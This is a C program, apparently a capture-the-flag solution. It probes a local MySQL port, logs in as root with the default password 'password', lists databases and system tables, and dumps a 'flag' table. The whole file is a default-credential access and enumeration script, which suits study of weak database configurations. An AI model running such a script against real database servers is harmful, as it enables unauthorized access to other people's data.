#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <mysql/mysql.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

/* For authorized security testing and CTF purposes only */

int scan_port(const char *host, int port) {
    struct sockaddr_in serv_addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &serv_addr.sin_addr);
    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return 0;
    }
    close(sock);
    return 1;
}

int main() {
    const char* user = "root";
    const char* pass = "password";
    printf("Connecting to MySQL with credentials: %s / %s\n", user, pass);

    const char* host = "127.0.0.1";
    int port = 3306;
    if (!scan_port(host, port)) {
        printf("MySQL port closed or filtered.\n");
        return 0;
    }

    MYSQL *conn;
    conn = mysql_init(NULL);
    if (!conn) {
        printf("mysql_init failed.\n");
        return 1;
    }
    if (!mysql_real_connect(conn, host, user, pass, NULL, port, NULL, 0)) {
        printf("Connection failed: %s\n", mysql_error(conn));
    } else {
        printf("Connected.\n");
        if (mysql_query(conn, "SELECT VERSION()")) {
            printf("Version query error: %s\n", mysql_error(conn));
        } else {
            MYSQL_RES *res = mysql_store_result(conn);
            if (res) {
                MYSQL_ROW row = mysql_fetch_row(res);
                if (row) printf("MySQL Version: %s\n", row[0]);
                mysql_free_result(res);
            }
        }
        if (mysql_query(conn, "SHOW DATABASES")) {
            printf("Error listing databases: %s\n", mysql_error(conn));
        } else {
            MYSQL_RES *res = mysql_store_result(conn);
            if (res) {
                MYSQL_ROW row;
                while ((row = mysql_fetch_row(res))) {
                    printf("DB Found: %s\n", row[0]);
                }
                mysql_free_result(res);
            }
        }
        if (!mysql_select_db(conn, "mysql")) {
            if (mysql_query(conn, "SHOW TABLES")) {
                printf("Error listing tables: %s\n", mysql_error(conn));
            } else {
                MYSQL_RES *res = mysql_store_result(conn);
                if (res) {
                    MYSQL_ROW row;
                    while ((row = mysql_fetch_row(res))) {
                        printf("Table in 'mysql': %s\n", row[0]);
                    }
                    mysql_free_result(res);
                }
            }
        }
        /* Example of trying to retrieve a 'flag' table */
        mysql_select_db(conn, "ctf");
        mysql_query(conn, "SHOW TABLES LIKE 'flag'");
        {
            MYSQL_RES *res = mysql_store_result(conn);
            if (res) {
                if (mysql_num_rows(res) > 0) {
                    mysql_free_result(res);
                    if (!mysql_query(conn, "SELECT * FROM flag")) {
                        MYSQL_RES *flagres = mysql_store_result(conn);
                        if (flagres) {
                            MYSQL_ROW flagrow;
                            while ((flagrow = mysql_fetch_row(flagres))) {
                                printf("Flag: %s\n", flagrow[0]);
                            }
                            mysql_free_result(flagres);
                        }
                    }
                } else {
                    mysql_free_result(res);
                }
            }
        }
    }
    mysql_close(conn);
    return 0;
}